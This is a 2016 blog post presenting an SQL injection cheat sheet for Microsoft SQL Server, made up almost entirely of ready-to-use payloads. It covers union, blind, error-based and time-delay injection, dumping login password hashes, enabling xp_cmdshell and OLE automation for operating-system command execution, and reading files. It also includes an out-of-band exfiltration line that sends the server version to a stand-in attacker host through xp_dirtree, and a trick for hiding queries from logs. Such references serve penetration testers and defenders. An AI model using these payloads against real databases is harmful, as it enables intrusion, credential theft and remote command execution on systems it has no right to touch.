---
title: 'SQL Injection Cheat Sheet: MSSQL'
date: 2016-04-11 20:20:57
tags: MSSQL Injection
---


### Comments

```
/*
--
;%00
```
>Example:

```
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';
```

### Version

```
SELECT @@version;
SELECT @@VERSION LIKE '%2008%';
```
>Example:

```
True if MSSQL version is 2008.
SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';
```
<!--more-->

### User details

```
SELECT user;
SELECT current_user;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT USER_NAME(2);
SELECT SUSER_SNAME();
SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
```



### Database details

```
SELECT DB_NAME();
SELECT DB_NAME(5);
SELECT name FROM master..sysdatabases;
```


### Database credentials

```
SELECT name %2b ':'  %2b master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
```



### Server details

```
SELECT @@servername; SELECT host_name(); SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel');
```
>Examples:

```
SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');
```

### Table Names

```
UNION SELECT name FROM master..sysobjects WHERE xtype='U';    #Union
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'; #Blind
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables); #Error
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables)); # Error
```

### Columns Names

```
UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename'); # Union
AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'; # Blind
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns); # Error
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns)); # Error
```
>An easier method is available starting with MSSQL 2005 and higher. The XML function path() works as a concatenator, allowing the retrieval of all tables with 1 query.


```
SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('');
```




### No Quotes

```
SELECT * FROM Users WHERE username = CHAR(97) + CHAR(98) + CHAR(99);
ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) = 97;
ASCII(SUBSTRING(SELECT TOP 1 username FROM Users,1,1)) < 128;
```

### String Concatenation

```
SELECT CONCAT('a','a','a');
SELECT 'a' %2b 'b' %2b 'c' %2b 'd';
```

### Conditionals

```
IF 1=1 SELECT 'true' ELSE SELECT 'false';
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

### Time-delay
```
WAITFOR DELAY 'time_to_pass';
WAITFOR TIME 'time_to_execute';
```
>Example:

```
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

### Enable Command Execution

```
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'xp_cmdshell', 1;
EXEC sp_configure reconfigure;
```


### Command Execution

```
EXEC master.dbo.xp_cmdshell 'cmd';
```


### Enable Alternative Command Execution

```
EXEC sp_configure 'show advanced options', 1;
EXEC sp_configure reconfigure;
EXEC sp_configure 'OLE Automation Procedures', 1;
EXEC sp_configure reconfigure;
```

### Alternative Command Execution

```
DECLARE @execmd INT;
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT;
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%system32cmd.exe /c';
```

### "RunAs"

```
SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'password', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
EXECUTE AS USER = 'FooUser';
```


### Read Files

```
BULK INSERT dbo.temp FROM 'c:foobar.txt' WITH ( ROWTERMINATOR='n' );
```

### Out-of-Band Retrieval

```
;declare @q varchar(200);set @q='\attacker.controlledserver'+(SELECT SUBSTRING(@@version,1,9))+'.malicious.com/foo'; exec master.dbo.xp_dirtree @q; --
```


### Substrings

```
SUBSTRING(table_name,1,1) FROM information_schema.tables = 'A';
ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables > 96;
```

### Retrieve Nth Line

```
SELECT TOP 1 table_name FROM information_schema.tables;
SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables);
```
### SP_PASSWORD (Hiding Query)
```
SP_PASSWORD
```
>Example:

```
' AND 1=1--sp_password
```

### Stacked Queries

>Example:


```
' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');
```
